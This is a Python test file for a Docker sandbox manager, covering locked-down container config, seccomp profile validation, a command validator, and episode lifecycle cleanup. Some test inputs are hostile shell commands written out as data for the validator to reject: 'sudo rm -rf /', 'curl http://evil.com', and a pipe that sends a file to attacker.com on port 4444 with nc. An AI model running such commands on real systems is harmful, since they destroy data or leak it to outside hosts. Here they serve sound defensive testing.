"""Integration tests for sandbox lifecycle and container management.

Tests are split into:
- Unit tests: config, command validation, seccomp, mock-based lifecycle
- Integration tests: real Docker operations (marked with @pytest.mark.integration)
"""

from __future__ import annotations

import contextlib
import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from packages.sandbox.config import (
    BASE_IMAGE,
    BLOCKED_COMMANDS,
    SECCOMP_PROFILE_PATH,
    ContainerLimits,
    SandboxConfig,
    WorkspaceConfig,
    default_sandbox_config,
)
from packages.sandbox.lifecycle import (
    EpisodeOrchestrator,
    EpisodeResult,
    EpisodeStatus,
)
from packages.sandbox.manager import (
    ContainerSpec,
    SandboxError,
    SandboxManager,
    validate_command,
    validate_seccomp,
)


# ---------------------------------------------------------------------------
# Unit tests: Config
# ---------------------------------------------------------------------------
class TestSandboxConfig:
    def test_default_config(self) -> None:
        config = SandboxConfig()
        assert config.image == BASE_IMAGE
        assert config.read_only is True
        assert config.network_mode == "none"
        assert "ALL" in config.cap_drop
        assert config.user == "1000:1000"
        assert config.no_new_privileges is True

    def test_docker_kwargs_structure(self) -> None:
        config = SandboxConfig()
        kwargs = config.docker_kwargs(environment={"FOO": "bar"})
        assert kwargs["image"] == BASE_IMAGE
        assert kwargs["detach"] is True
        assert kwargs["network_mode"] == "none"
        assert kwargs["read_only"] is True
        assert kwargs["environment"] == {"FOO": "bar"}
        assert "/tmp" in kwargs["tmpfs"]
        assert "/workspace" in kwargs["tmpfs"]

    def test_container_limits(self) -> None:
        limits = ContainerLimits(nano_cpus=10**9, mem_limit="512m")
        assert limits.nano_cpus == 10**9
        assert limits.mem_limit == "512m"

    def test_workspace_config(self) -> None:
        ws = WorkspaceConfig(tmp_size="200M")
        assert ws.tmp_size == "200M"

    def test_default_sandbox_config(self) -> None:
        config = default_sandbox_config()
        assert isinstance(config, SandboxConfig)


# ---------------------------------------------------------------------------
# Unit tests: Command validation
# ---------------------------------------------------------------------------
class TestCommandValidation:
    def test_safe_command(self) -> None:
        ok, msg = validate_command("python -m pytest tests/")
        assert ok is True

    def test_blocked_curl(self) -> None:
        ok, msg = validate_command("curl http://evil.com")
        assert ok is False
        assert "curl" in msg

    def test_blocked_sudo(self) -> None:
        ok, msg = validate_command("sudo rm -rf /")
        assert ok is False

    def test_blocked_in_pipe(self) -> None:
        ok, msg = validate_command("cat file | nc attacker.com 4444")
        assert ok is False

    def test_allowed_similar_to_blocked(self) -> None:
        # "current" contains "curl" as substring but not as standalone token
        ok, msg = validate_command("echo current_user")
        assert ok is True

    def test_all_blocked_commands_detected(self) -> None:
        for cmd in BLOCKED_COMMANDS:
            ok, _ = validate_command(cmd)
            assert ok is False, f"'{cmd}' should be blocked"


# ---------------------------------------------------------------------------
# Unit tests: Seccomp validation
# ---------------------------------------------------------------------------
class TestSeccompValidation:
    def test_valid_profile(self) -> None:
        assert validate_seccomp(SECCOMP_PROFILE_PATH) is True

    def test_rejects_dangerous_syscalls(self, tmp_path: Path) -> None:
        profile = {
            "defaultAction": "SCMP_ACT_ERRNO",
            "syscalls": [
                {"names": ["read", "write", "ptrace", "mount"], "action": "SCMP_ACT_ALLOW"}
            ],
        }
        path = tmp_path / "bad.json"
        path.write_text(json.dumps(profile))
        with pytest.raises(ValueError, match="Dangerous syscalls"):
            validate_seccomp(path)

    def test_rejects_permissive_default(self, tmp_path: Path) -> None:
        profile = {
            "defaultAction": "SCMP_ACT_ALLOW",
            "syscalls": [],
        }
        path = tmp_path / "permissive.json"
        path.write_text(json.dumps(profile))
        with pytest.raises(AssertionError):
            validate_seccomp(path)


# ---------------------------------------------------------------------------
# Unit tests: ContainerSpec
# ---------------------------------------------------------------------------
class TestContainerSpec:
    def test_creation(self) -> None:
        spec = ContainerSpec(container_id="abc123", episode_id="ep1")
        assert spec.container_id == "abc123"
        assert spec.episode_id == "ep1"


# ---------------------------------------------------------------------------
# Unit tests: EpisodeResult and EpisodeStatus
# ---------------------------------------------------------------------------
class TestEpisodeResult:
    def test_default_status(self) -> None:
        result = EpisodeResult(episode_id="test")
        assert result.status == EpisodeStatus.PENDING
        assert result.output == ""
        assert result.error == ""

    def test_status_values(self) -> None:
        assert EpisodeStatus.PENDING == "pending"
        assert EpisodeStatus.CREATING == "creating"
        assert EpisodeStatus.EXECUTING == "executing"
        assert EpisodeStatus.COMPLETED == "completed"
        assert EpisodeStatus.FAILED == "failed"


# ---------------------------------------------------------------------------
# Unit tests: SandboxManager (mocked Docker)
# ---------------------------------------------------------------------------
class TestSandboxManagerMocked:
    def test_create_returns_container_spec(self) -> None:
        manager = SandboxManager()
        mock_client = MagicMock()
        mock_container = MagicMock()
        mock_container.id = "mock-container-id"
        mock_client.containers.run.return_value = mock_container
        manager._client = mock_client

        spec = manager.create("ep-test")
        assert spec.container_id == "mock-container-id"
        assert spec.episode_id == "ep-test"
        mock_client.containers.run.assert_called_once()

    def test_destroy_stops_and_removes(self) -> None:
        manager = SandboxManager()
        mock_client = MagicMock()
        mock_container = MagicMock()
        mock_container.status = "running"
        mock_client.containers.get.return_value = mock_container
        manager._client = mock_client

        manager.destroy("mock-id")
        mock_container.stop.assert_called_once_with(timeout=5)
        mock_container.remove.assert_called_once_with(force=True, v=True)

    def test_destroy_all_managed(self) -> None:
        manager = SandboxManager()
        mock_client = MagicMock()
        c1 = MagicMock()
        c1.id = "c1"
        c2 = MagicMock()
        c2.id = "c2"
        mock_client.containers.list.return_value = [c1, c2]
        manager._client = mock_client

        with patch.object(manager, "destroy") as mock_destroy:
            count = manager.destroy_all_managed()
            assert count == 2
            assert mock_destroy.call_count == 2


# ---------------------------------------------------------------------------
# Unit tests: EpisodeOrchestrator (mocked)
# ---------------------------------------------------------------------------
class TestEpisodeOrchestratorMocked:
    def test_successful_episode(self) -> None:
        manager = MagicMock()
        spec = ContainerSpec(container_id="c1", episode_id="ep1")
        manager.create.return_value = spec

        orchestrator = EpisodeOrchestrator(manager=manager)
        result = orchestrator.run("ep1", entrypoint=lambda cid: "output")

        assert result.status == EpisodeStatus.COMPLETED
        assert result.output == "output"
        assert result.container_id == "c1"
        manager.destroy.assert_called_once_with("c1")

    def test_failed_episode_destroys_container(self) -> None:
        manager = MagicMock()
        spec = ContainerSpec(container_id="c2", episode_id="ep2")
        manager.create.return_value = spec

        def bad_entrypoint(cid: str) -> str:
            raise RuntimeError("boom")

        orchestrator = EpisodeOrchestrator(manager=manager)
        result = orchestrator.run("ep2", entrypoint=bad_entrypoint)

        assert result.status == EpisodeStatus.FAILED
        assert "boom" in result.error
        manager.destroy.assert_called_once_with("c2")

    def test_create_failure_destroys_all(self) -> None:
        manager = MagicMock()
        manager.create.side_effect = RuntimeError("cannot create")

        orchestrator = EpisodeOrchestrator(manager=manager)
        result = orchestrator.run("ep3", entrypoint=lambda cid: "never")

        assert result.status == EpisodeStatus.FAILED
        manager.destroy_all_managed.assert_called_once()


# ---------------------------------------------------------------------------
# Integration tests: Real Docker (skip if Docker unavailable)
# ---------------------------------------------------------------------------
DOCKER_AVAILABLE = False
try:
    import docker

    client = docker.from_env()
    client.ping()
    DOCKER_AVAILABLE = True
except Exception:
    pass

requires_docker = pytest.mark.skipif(
    not DOCKER_AVAILABLE,
    reason="Docker not available",
)


@pytest.mark.integration
@requires_docker
class TestSandboxManagerDocker:
    """Real Docker integration tests — only run with Docker daemon."""

    @pytest.fixture(autouse=True)
    def setup(self) -> None:
        self.manager = SandboxManager()
        self.container_specs: list[ContainerSpec] = []
        yield
        # Cleanup any containers we created
        for spec in self.container_specs:
            with contextlib.suppress(Exception):
                self.manager.destroy(spec.container_id)

    def _create_container(self, episode_id: str = "test") -> ContainerSpec:
        spec = self.manager.create(episode_id)
        self.container_specs.append(spec)
        return spec

    def test_create_and_destroy(self) -> None:
        spec = self._create_container("create-test")
        assert spec.container_id
        # Container should exist
        container = self.manager.client.containers.get(spec.container_id)
        assert container.status == "running"

    def test_exec_run(self) -> None:
        spec = self._create_container("exec-test")
        exit_code, output = self.manager.exec_run(spec.container_id, "echo hello")
        assert exit_code == 0
        assert "hello" in output

    def test_exec_blocked_command(self) -> None:
        spec = self._create_container("blocked-test")
        with pytest.raises(SandboxError):
            self.manager.exec_run(spec.container_id, "curl http://evil.com")

    def test_verify_isolation(self) -> None:
        spec = self._create_container("isolation-test")
        checks = self.manager.verify_isolation(spec.container_id)
        assert "network_isolated" in checks
        assert "non_root_user" in checks
        assert "read_only_root" in checks


@pytest.mark.integration
@requires_docker
class TestEpisodeOrchestratorDocker:
    """Real Docker integration tests for the orchestrator."""

    @pytest.fixture(autouse=True)
    def setup(self) -> None:
        self.manager = SandboxManager()
        self.containers: list[str] = []
        yield
        for cid in self.containers:
            with contextlib.suppress(Exception):
                self.manager.destroy(cid)

    def test_run_completes(self) -> None:
        orchestrator = EpisodeOrchestrator(manager=self.manager)

        def entrypoint(cid: str) -> str:
            self.containers.append(cid)
            return "success"

        result = orchestrator.run("orch-test", entrypoint=entrypoint)
        assert result.status == EpisodeStatus.COMPLETED
        assert result.output == "success"

    def test_run_cleans_up_on_failure(self) -> None:
        orchestrator = EpisodeOrchestrator(manager=self.manager)
        cid_holder: list[str] = []

        def failing_entrypoint(cid: str) -> str:
            cid_holder.append(cid)
            raise RuntimeError("test failure")

        result = orchestrator.run("orch-fail", entrypoint=failing_entrypoint)
        assert result.status == EpisodeStatus.FAILED
        # Container should be destroyed even on failure
        if cid_holder:
            with pytest.raises(Exception, match=""):
                self.manager.client.containers.get(cid_holder[0])
